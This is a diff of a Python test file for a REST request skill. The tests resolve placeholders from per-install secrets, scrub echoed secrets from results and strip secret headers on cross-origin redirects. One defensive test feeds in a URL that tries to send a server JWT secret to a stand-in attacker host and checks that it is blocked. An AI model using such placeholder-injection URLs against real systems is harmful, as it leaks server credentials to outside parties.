@@ -7,7 +7,7 @@ import pytest
 
 from src.skills.registry import SkillRegistry
 from src.skills.rest_template.actions import get, post
-from src.skills.rest_template.helper import expand_env_placeholders, redact_headers, redact_url
+from src.skills.rest_template.helper import AgentSecrets, redact_headers, redact_url
 from src.skills.rest_template.models import MAX_TIMEOUT_SECONDS, RestRequest
 
 
@@ -47,8 +47,8 @@ def _response(
 def test_rest_template_get_sends_url_headers_and_query(monkeypatch):
     fake_client = FakeAsyncClient(_response(json_data={"items": []}))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     result = asyncio.run(
@@ -77,8 +77,8 @@ def test_rest_template_get_sends_url_headers_and_query(monkeypatch):
 def test_rest_template_post_sends_json_body(monkeypatch):
     fake_client = FakeAsyncClient(_response(status_code=201, json_data={"created": True}))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     result = asyncio.run(
@@ -137,8 +137,8 @@ def test_rest_template_full_response_includes_json_and_redacts_headers(monkeypat
         )
     )
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     result = asyncio.run(
@@ -163,8 +163,8 @@ def test_rest_template_full_response_includes_json_and_redacts_headers(monkeypat
 def test_rest_template_non_json_full_response_has_preview_without_body_json(monkeypatch):
     fake_client = FakeAsyncClient(_response(text="plain text", headers={"content-type": "text/plain"}))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     result = asyncio.run(
@@ -185,8 +185,8 @@ def test_rest_template_non_json_full_response_has_preview_without_body_json(monk
 def test_rest_template_large_response_truncates_only_reporting_flag_in_full_response(monkeypatch):
     fake_client = FakeAsyncClient(_response(text="abcdef"))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     compact = asyncio.run(get({"url": "https://api.example.com/items", "max_response_chars": 3}, {}, {}))
@@ -211,8 +211,8 @@ def test_rest_template_large_response_truncates_only_reporting_flag_in_full_resp
 def test_rest_template_http_error_returns_branchable_payload(monkeypatch):
     fake_client = FakeAsyncClient(_response(status_code=401, text='{"error":"invalid token"}'))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     result = asyncio.run(get({"url": "https://api.example.com/items"}, {}, {}))
@@ -228,8 +228,8 @@ def test_rest_template_transport_error_returns_human_readable_payload(monkeypatc
     request = httpx.Request("GET", "https://api.example.com/items")
     fake_client = FakeAsyncClient(error=httpx.ConnectError("network unreachable", request=request))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     result = asyncio.run(get({"url": "https://api.example.com/items?token=secret"}, {}, {}))
@@ -241,12 +241,11 @@ def test_rest_template_transport_error_returns_human_readable_payload(monkeypatc
     assert "token=secret" not in result["error"]
 
 
-def test_rest_template_environment_placeholders_are_resolved(monkeypatch):
-    monkeypatch.setenv("api_token", "secret-token")
+def test_rest_template_placeholders_resolve_from_the_installs_secrets(monkeypatch):
     fake_client = FakeAsyncClient(_response(json_data={"ok": True}))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     asyncio.run(
@@ -255,7 +254,7 @@ def test_rest_template_environment_placeholders_are_resolved(monkeypatch):
                 "url": "https://api.example.com/items",
                 "headers": {"Authorization": "Bearer {{ api_token }}"},
             },
-            {},
+            {"secrets": {"api_token": "secret-token"}},
             {},
         )
     )
@@ -263,31 +262,88 @@ def test_rest_template_environment_placeholders_are_resolved(monkeypatch):
     assert fake_client.calls[0]["headers"]["Authorization"] == "Bearer secret-token"
 
 
-def test_rest_template_missing_environment_placeholder_fails_before_dispatch(monkeypatch):
-    monkeypatch.delenv("api_token", raising=False)
+def test_rest_template_never_reads_the_server_environment(monkeypatch):
+    monkeypatch.setenv("JWT_SECRET", "server-secret")
     fake_client = FakeAsyncClient(_response(json_data={"ok": True}))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
-    with pytest.raises(ValueError, match="api_token"):
+    with pytest.raises(ValueError, match="not one of this skill's configured secrets") as raised:
         asyncio.run(
             get(
-                {
-                    "url": "https://api.example.com/items",
-                    "headers": {"Authorization": "Bearer {{ api_token }}"},
-                },
-                {},
+                {"url": "https://attacker.example/?s={{ JWT_SECRET }}"},
+                {"secrets": {"api_token": "secret-token"}},
                 {},
             )
         )
+    assert "api_token" not in str(raised.value)
     assert fake_client.calls == []
 
 
-def test_rest_template_helper_redaction_and_placeholder(monkeypatch):
-    monkeypatch.setenv("api_token", "secret-token")
-    assert expand_env_placeholders({"header": "Bearer {{ api_token }}"}) == {"header": "Bearer secret-token"}
+def test_rest_template_scrubs_echoed_secrets_from_the_result(monkeypatch):
+    fake_client = FakeAsyncClient(
+        _response(
+            json_data={"echo": {"authorization": "Bearer secret-token"}},
+            headers={"content-type": "application/json", "x-echo": "secret-token"},
+        )
+    )
+    monkeypatch.setattr(
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
+    )
+
+    result = asyncio.run(
+        get(
+            {
+                "url": "https://api.example.com/echo",
+                "headers": {"Authorization": "Bearer {{ api_token }}"},
+                "include_full_response": True,
+            },
+            {"secrets": {"api_token": "secret-token"}},
+            {},
+        )
+    )
+
+    assert "secret-token" not in str(result)
+    assert result["body_json"] == {"echo": {"authorization": "Bearer [redacted]"}}
+
+
+def test_rest_template_drops_secret_headers_on_cross_origin_redirects(monkeypatch):
+    seen: list[httpx.Request] = []
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        seen.append(request)
+        if request.url.host == "api.example.com":
+            return httpx.Response(302, headers={"location": "https://elsewhere.example/landing"})
+        return httpx.Response(200, text="ok")
+
+    monkeypatch.setattr(
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: httpx.AsyncClient(transport=httpx.MockTransport(handler), follow_redirects=True, **kwargs),
+    )
+
+    asyncio.run(
+        get(
+            {
+                "url": "https://api.example.com/items",
+                "headers": {"X-Api-Token": "{{ api_token }}", "Accept": "text/plain"},
+            },
+            {"secrets": {"api_token": "secret-token"}},
+            {},
+        )
+    )
+
+    assert seen[0].headers["x-api-token"] == "secret-token"
+    assert "x-api-token" not in seen[1].headers
+    assert seen[1].headers["accept"] == "text/plain"
+
+
+def test_rest_template_helper_redaction_and_placeholder():
+    secrets = AgentSecrets({"api_token": "secret-token"})
+    assert secrets.expand({"header": "Bearer {{ api_token }}"}) == {"header": "Bearer secret-token"}
+    assert secrets.scrub(["Bearer secret-token"]) == ["Bearer [redacted]"]
     assert redact_headers({"Authorization": "Bearer secret", "x-trace": "1"}) == {
         "Authorization": "[redacted]",
         "x-trace": "1",
@@ -298,8 +354,8 @@ def test_rest_template_helper_redaction_and_placeholder(monkeypatch):
 def test_rest_template_registry_alias_uses_get_handler(monkeypatch):
     fake_client = FakeAsyncClient(_response(text="ok"))
     monkeypatch.setattr(
-        "src.skills.rest_template.actions.httpx.AsyncClient",
-        lambda timeout, follow_redirects: fake_client,
+        "src.skills.rest_template.actions.outbound.async_client",
+        lambda **kwargs: fake_client,
     )
 
     registry = SkillRegistry()
